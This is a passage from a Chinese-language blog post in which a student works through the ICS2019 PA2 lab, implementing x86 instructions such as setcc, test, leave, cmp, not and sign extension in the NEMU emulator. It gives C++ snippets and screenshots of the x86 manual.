C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_lr</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> width)</span> </span>{ <span class="hljs-keyword">switch</span> (width) {  <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-built_in">rtl_mv</span>(dest, &amp;<span class="hljs-built_in">reg_l</span>(r)); <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-built_in">rtl_host_lm</span>(dest, &amp;<span class="hljs-built_in">reg_b</span>(r), <span class="hljs-number">1</span>); <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-built_in">rtl_host_lm</span>(dest, &amp;<span class="hljs-built_in">reg_w</span>(r), <span class="hljs-number">2</span>); <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">default</span>: <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>); }}</code></pre></div></div><p>lr或sr的时候宽度小于4</p><p>而<code>guest</code>内存访问和<code>host</code>内存访问指令的区别在于一个是直接赋值，另一个是经过了<code>vaddr</code>转换。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p434snlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-p434snlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">interpret_rtl_lm</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* addr, <span class="hljs-type">int</span> len)</span> </span>{  *dest = <span class="hljs-built_in">vaddr_read</span>(*addr, len);}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-68wpzvlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-68wpzvlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">interpret_rtl_host_lm</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *addr, <span class="hljs-type">int</span> len)</span> </span>{  <span class="hljs-keyword">switch</span> (len) {    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: *dest = *(<span class="hljs-type">uint32_t</span> *)addr; <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: *dest = *( <span class="hljs-type">uint8_t</span> *)addr; <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: *dest = *(<span class="hljs-type">uint16_t</span> *)addr; <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }}</code></pre></div></div><p><code>vaddr_read</code>是由MMU来完成的。目前不是很明白调用不同宽度的lr会导致读的内存类型不一样，对这个问题也不太能做出满意的回答。</p><h2 id="二阶段">二阶段</h2><p>关于AM做了什么的事情，学校手册特意标了红色:</p><p>AM 在概念上定义了一台抽象计算机,它从运行程序的视角刻画了一台计算机应该具备的功能,而真机和NEMU都是这台抽象计算机的具体实现,只是真机是通过物理上存在的数字电路来实现,NEMU是通过程序来实现。</p><h3 id="更多指令实现">更多指令实现</h3><h4 id="任务-1">任务</h4><p><code>nemu</code>目录运行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k0sclwlmrh9u68"></i><span>shell</span><div class="collapse show" id="collapse-k0sclwlmrh9u68"><pre><code class="hljs shell">bash runall.sh ISA=x86</code></pre></div></div><p>可以看到第一个需要实现的是<code>add_longlong</code>。</p><p>这里面第一个需要实现的指令是<code>lea</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210953365114_681_20230523225452474954_811_image-20230417215053287.png" alt="image-20230417215053287"><figcaption aria-hidden="true">image-20230417215053287</figcaption></figure><p>查表加上<code>opcode_table</code>之后提示我<code>exec_and</code>没实现。其实这不是<code>lea</code>的锅。因为框架把<code>make_EHelper(lea)</code>已经实现了，<code>lea</code>就这样完成了。实际上是因为<code>10060</code>的<code>and</code>指令导致的。</p><p>下一个是<code>pushl</code>。</p><p>在手册附录的Opcode Map发现这个位置是一个指令组:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210954270458_365_20230523225455484191_658_image-20230417221653277.png" alt="image-20230417221653277"><figcaption aria-hidden="true">image-20230417221653277</figcaption></figure><p>在Push页面能够看到对应的说明:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210955314802_440_20230523225457657194_609_image-20230417221609462.png" alt="image-20230417221609462"><figcaption aria-hidden="true">image-20230417221609462</figcaption></figure><p>上网查阅，反汇编码 <code>pushl</code> 相当于<code>push dword</code>。</p><p>这个<code>pushl</code>也是把指令组写了，把操作码写了，就完成了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210956604972_234_20230523225500684153_287_image-20230417222933927.png" alt="image-20230417222933927"><figcaption aria-hidden="true">image-20230417222933927</figcaption></figure><p><code>nop</code>也得专门整个<code>opcode</code></p><p>下面是add</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210958013044_302_20230523225502914875_765_image-20230417223533752.png" alt="image-20230417223533752"><figcaption aria-hidden="true">image-20230417223533752</figcaption></figure><p>看手册，正好一起把同类型的<code>add</code>都填了。</p><p>下面是<code>adc</code>。<code>adc</code>是带进位加法。其实开头的几个算术和逻辑指令格式都很像，参照着手册填下来就好了。</p><p>已经感受到这一部分更多的是体力活了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210959123415_355_20230523225508150223_875_image-20230417224319863.png" alt="image-20230417224319863"><figcaption aria-hidden="true">image-20230417224319863</figcaption></figure><p>可以看到0f是<code>2byte-escape</code>，这是我们遇到的第一个两字节操作码指令。查2字节的opcode，是这个</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210959943782_857_20230523225511539214_937_image-20230417224352754.png" alt="image-20230417224352754"><figcaption aria-hidden="true">image-20230417224352754</figcaption></figure><p>这一堆setx指令都很像，属于条件置位指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211001084485_247_20230523225514028827_543_image-20230417224949597.png" alt="image-20230417224949597"><figcaption aria-hidden="true">image-20230417224949597</figcaption></figure><p>emm有一个手册里没有必须要看源码才知道的事情，就是<code>nemu</code>将这一类指令抽象成了<code>setcc</code></p><p>执行阶段给出了实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jmxekhlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-jmxekhlmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(setcc) {  <span class="hljs-type">uint32_t</span> cc = decinfo.opcode &amp; <span class="hljs-number">0xf</span>;  <span class="hljs-built_in">rtl_setcc</span>(&amp;s0, cc);  <span class="hljs-built_in">operand_write</span>(id_dest, &amp;s0);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"set%s %s"</span>, <span class="hljs-built_in">get_cc_name</span>(cc), id_dest-&gt;str);</code></pre></div></div><p><code>rtl_setcc</code>需要我们自己实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x6dz99lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-x6dz99lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rtl_setcc</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">uint8_t</span> subcode)</span> </span>{  <span class="hljs-type">bool</span> invert = subcode &amp; <span class="hljs-number">0x1</span>;  <span class="hljs-keyword">enum</span> {    CC_O, CC_NO, CC_B,  CC_NB,    CC_E, CC_NE, CC_BE, CC_NBE,    CC_S, CC_NS, CC_P,  CC_NP,    CC_L, CC_NL, CC_LE, CC_NLE  };  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Query EFLAGS to determine whether the condition code is satisfied.</span>  <span class="hljs-comment">// dest &lt;- ( cc is satisfied ? 1 : 0)</span>  <span class="hljs-keyword">switch</span> (subcode &amp; <span class="hljs-number">0xe</span>) {    <span class="hljs-keyword">case</span> CC_O:{<span class="hljs-built_in">rtl_get_OF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_B:{<span class="hljs-built_in">rtl_get_CF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_E:{<span class="hljs-built_in">rtl_get_ZF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_BE:{<span class="hljs-built_in">rtl_get_CF</span>(&amp;t0);<span class="hljs-built_in">rtl_get_ZF</span>(&amp;t1);<span class="hljs-built_in">rtl_or</span>(dest,&amp;t0,&amp;t1);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_S:{<span class="hljs-built_in">rtl_get_SF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_L:{<span class="hljs-built_in">rtl_get_SF</span>(&amp;t0);<span class="hljs-built_in">rtl_get_OF</span>(&amp;t1);<span class="hljs-built_in">rtl_xor</span>(dest,&amp;t0,&amp;t1);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_LE:{<span class="hljs-built_in">rtl_get_SF</span>(&amp;t0);<span class="hljs-built_in">rtl_get_OF</span>(&amp;t1);<span class="hljs-built_in">rtl_xor</span>(dest,&amp;t0,&amp;t1);<span class="hljs-built_in">rtl_get_ZF</span>(&amp;t0);<span class="hljs-built_in">rtl_or</span>(dest,dest,&amp;t0);<span class="hljs-keyword">break</span>;}      <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"should not reach here"</span>);    <span class="hljs-keyword">case</span> CC_P: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"n86 does not have PF"</span>);  }  <span class="hljs-keyword">if</span> (invert) {    <span class="hljs-built_in">rtl_xori</span>(dest, dest, <span class="hljs-number">0x1</span>);  }  <span class="hljs-built_in">assert</span>(*dest == <span class="hljs-number">0</span> || *dest == <span class="hljs-number">1</span>);}</code></pre></div></div><p>这一部分主要根据指令含义和文档完成。</p><p>至于填<code>opcode_table</code>，理解了之后自然就知道要填到下面一组了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211001972913_374_20230523225518351098_207_image-20230417230808371.png" alt="image-20230417230808371"><figcaption aria-hidden="true">image-20230417230808371</figcaption></figure><p>0f是2字节opcode，找第二个mapb对应的那一行</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211003032356_500_20230523225520582515_551_image-20230418013425827.png" alt="image-20230418013425827"><figcaption aria-hidden="true">image-20230418013425827</figcaption></figure><p>可以看到movvsx和movvzx。这两个指令都是在mov的基础上加了符号拓展功能。</p><p>可以看到框架里已经实现了，填表即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i4n4k7lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-i4n4k7lmrh9u68"><pre><code class="hljs C++"><span class="hljs-comment">/* 0xb4 */</span>EMPTY, EMPTY, <span class="hljs-built_in">IDEXW</span>(mov_E2G,movzx,<span class="hljs-number">1</span>), <span class="hljs-built_in">IDEXW</span>(mov_E2G,movzx,<span class="hljs-number">2</span>),<span class="hljs-comment">/* 0xb8 */</span>EMPTY, EMPTY, EMPTY, EMPTY,<span class="hljs-comment">/* 0xbc */</span>EMPTY, EMPTY, <span class="hljs-built_in">IDEXW</span>(mov_E2G,movsx,<span class="hljs-number">1</span>), <span class="hljs-built_in">IDEXW</span>(mov_E2G,movsx,<span class="hljs-number">2</span>),</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211004265633_434_20230523225522647884_770_image-20230418013811138.png" alt="image-20230418013811138"><figcaption aria-hidden="true">image-20230418013811138</figcaption></figure><p>test</p><p>根据手册，TEST 计算其两个操作数的按位逻辑与。每一位如果操作数的对应位均为 1，则结果为1，否则为0.运算结果被丢弃，只改变标志寄存器。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211005286340_139_20230523225525580415_996_image-20230418014447181.png" alt="image-20230418014447181"><figcaption aria-hidden="true">image-20230418014447181</figcaption></figure><p>据此实现即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wh57ollmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-wh57ollmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(test) {  <span class="hljs-built_in">rtl_li</span>(&amp;s1,<span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);  <span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);  <span class="hljs-built_in">rtl_and</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);  <span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);  <span class="hljs-built_in">print_asm_template2</span>(test);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211006164465_661_20230523225528634250_287_image-20230418014935039.png" alt="image-20230418014935039"><figcaption aria-hidden="true">image-20230418014935039</figcaption></figure><p>框架将这一类型的执行抽象成了<code>jcc</code>，调用了之前提到的<code>setcc</code>。因此可以这样填:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4kweq5lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-4kweq5lmrh9u68"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x70 */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-comment">/* 0x74 */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-comment">/* 0x78 */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-comment">/* 0x7c */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211007026317_528_20230523225532714858_663_image-20230418015752384.png" alt="image-20230418015752384"><figcaption aria-hidden="true">image-20230418015752384</figcaption></figure><p>leave</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211008006723_218_20230523225537226215_675_image-20230418015919938.png" alt="image-20230418015919938"><figcaption aria-hidden="true">image-20230418015919938</figcaption></figure><p>填表，补充执行逻辑:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fm3e68lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-fm3e68lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(leave) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-built_in">rtl_mv</span>(&amp;cpu.esp,&amp;cpu.ebp);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.ebp);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"leave"</span>);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211008961219_129_20230523225541621025_331_image-20230418020130781.png" alt="image-20230418020130781"><figcaption aria-hidden="true">image-20230418020130781</figcaption></figure><p>dec，inc，cmp</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ueo386lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-ueo386lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(cmp) {<span class="hljs-comment">//  TODO();</span><span class="hljs-built_in">rtl_sub</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">rtl_is_sub_carry</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val);<span class="hljs-comment">//printf("%d %d %d %d\n",s1,s0,id_dest-&gt;val,id_dest-&gt;width);</span><span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);<span class="hljs-built_in">rtl_is_sub_overflow</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val,id_dest-&gt;width);<span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-comment">//if (id_src-&gt;val==0x40) printf("bian=%d\n",id_dest-&gt;val);</span><span class="hljs-built_in">print_asm_template2</span>(cmp);}<span class="hljs-built_in">make_EHelper</span>(inc) {<span class="hljs-comment">//  TODO();</span><span class="hljs-built_in">rtl_li</span>(&amp;s1,<span class="hljs-number">1</span>);  <span class="hljs-built_in">rtl_add</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;s1);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">rtl_is_add_overflow</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val,&amp;s1,id_dest-&gt;width);<span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);<span class="hljs-built_in">print_asm_template1</span>(inc);}</code></pre></div></div><p><code>dec</code>一样的道理，就不放了。</p><p>终于迎来了二阶段的第一个<strong><font color="green">HIT GOODTRAP</font></strong>！<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211009777130_241_20230523225545270182_921_image-20230418023433434.png" alt="image-20230418023433434"></p><p>加上中间填<code>op_table</code>习惯性的把旁边的也填了，其实现在就已经过的不少了。而且也发现名称排列和难度并不是对应的。。。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211010814853_962_20230523225547548141_708_image-20230418024006777.png" alt="image-20230418024006777"><figcaption aria-hidden="true">image-20230418024006777</figcaption></figure><p>比如<code>add</code>里面有一个0x6a打头的push，中间做的时候也把它写了。</p><p>bit里面这个指令还过不去</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211011974792_798_20230523225552798478_263_image-20230418024335643.png" alt="image-20230418024335643"><figcaption aria-hidden="true">image-20230418024335643</figcaption></figure><p>看手册是<code>Shift Grp2</code>的指令，看源码是<code>sar</code>指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211012908169_848_20230523225556392323_529_image-20230418024515008.png" alt="image-20230418024515008"><figcaption aria-hidden="true">image-20230418024515008</figcaption></figure><p>这一组带S指令都有移位功能，源码里的TODO也挨着，就对着手册一起做了。</p><p>框架中没有<code>exec_rol</code>，现在<code>make_group</code>的时候加上会报错。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211015047565_478_20230523225600429965_544_image-20230418030440421.png" alt="image-20230418030440421"><figcaption aria-hidden="true">image-20230418030440421</figcaption></figure><p>这个是<code>not</code>，对应第三个指令组，开填。</p><p>至于实现，这应该是最简单的一个。。。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l254tqlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-l254tqlmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-keyword">not</span>) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-built_in">rtl_not</span>(&amp;s0,&amp;id_dest-&gt;val);  <span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);  <span class="hljs-built_in">print_asm_template1</span>(<span class="hljs-keyword">not</span>);}</code></pre></div></div><p>还有一个<code>rtl_not</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bns4fhlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-bns4fhlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_not</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* src1)</span> </span>{  <span class="hljs-comment">// dest &lt;- ~src1</span><span class="hljs-comment">//  TODO();</span>*dest=~(*src1);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211016555061_465_20230523225605558034_150_image-20230418031209236.png" alt="image-20230418031209236"><figcaption aria-hidden="true">image-20230418031209236</figcaption></figure><p>到div了。</p><p>imul</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211017591066_520_20230523225610807036_934_image-20230418032107060.png" alt="image-20230418032107060"><figcaption aria-hidden="true">image-20230418032107060</figcaption></figure><p>填表即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211018515110_896_20230523225613870020_798_image-20230418032213094.png" alt="image-20230418032213094"><figcaption aria-hidden="true">image-20230418032213094</figcaption></figure><p>符号拓展</p><p>这个要填rtl。利用好抽象层的东西。不就是把低位搬到高位么。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4p39celmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-4p39celmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_sext</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* src1, <span class="hljs-type">int</span> width)</span> </span>{  <span class="hljs-comment">// dest &lt;- signext(src1[(width * 8 - 1) .. 0])</span><span class="hljs-comment">//  TODO();</span><span class="hljs-built_in">rtl_shli</span>(&amp;t0,src1,<span class="hljs-number">32</span>-width*<span class="hljs-number">8</span>);<span class="hljs-built_in">rtl_sari</span>(dest,&amp;t0,<span class="hljs-number">32</span>-width*<span class="hljs-number">8</span>);}</code></pre></div></div><p>下面指令果然涉及到了符号拓展。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211019431563_647_20230523225618043780_280_image-20230418033030503.png" alt="image-20230418033030503"><figcaption aria-hidden="true">image-20230418033030503</figcaption></figure><p>手册里说这个位置是cwd，但</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211020458211_219_20230523225621183658_884_image-20230418033009533.png" alt="image-20230418033009533"><figcaption aria-hidden="true">image-20230418033009533</figcaption></figure><p>框架中给的是cltd和cwtl，cltd就是CWD/CDQ，而cwtl对应CBW/CWDE。</p><p>按理说可以调抽象层的接口，但我总是调不对。。只好重新造轮子了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x6z7nolmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-x6z7nolmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(cltd) {  <span class="hljs-keyword">if</span> (decinfo.isa.is_operand_size_16) {    <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">if</span> ((cpu.eax&gt;&gt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">1</span>) cpu.edx|=<span class="hljs-number">0x0000ffff</span>;    <span class="hljs-keyword">else</span> cpu.edx&amp;=<span class="hljs-number">0xffff0000</span>;  }  <span class="hljs-keyword">else</span> {    <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">if</span> ((cpu.eax&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>) cpu.edx|=<span class="hljs-number">0xffffffff</span>;    <span class="hljs-keyword">else</span> cpu.edx&amp;=<span class="hljs-number">0</span>;  }  <span class="hljs-built_in">print_asm</span>(decinfo.isa.is_operand_size_16 ? <span class="hljs-string">"cwtl"</span> : <span class="hljs-string">"cltd"</span>);}<span class="hljs-built_in">make_EHelper</span>(cwtl) {  <span class="hljs-keyword">if</span> (decinfo.isa.is_operand_size_16) {    <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">if</span> ((cpu.eax&gt;&gt;<span class="hljs-number">7</span>)&amp;<span class="hljs-number">1</span>) cpu.eax|=<span class="hljs-number">0x0000ff00</span>;    <span class="hljs-keyword">else</span> cpu.eax&amp;=<span class="hljs-number">0xffff00ff</span>;  }  <span class="hljs-keyword">else</span> {    <span class="hljs-keyword">if</span> ((cpu.eax&gt;&gt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">1</span>) cpu.eax|=<span class="hljs-number">0xffff0000</span>;    <span class="hljs-keyword">else</span> cpu.eax&amp;=<span class="hljs-number">0x0000ffff</span>;  }  <span class="hljs-built_in">print_asm</span>(decinfo.isa.is_operand_size_16 ? <span class="hljs-string">"cbtw"</span> : <span class="hljs-string">"cwtl"</span>);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211021325565_511_20230523225625599245_402_image-20230418034230992.png" alt="image-20230418034230992"><figcaption aria-hidden="true">image-20230418034230992</figcaption></figure><p>还差两个</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211022715667_250_20230523225630693991_523_image-20230418034312229.png" alt="image-20230418034312229"><figcaption 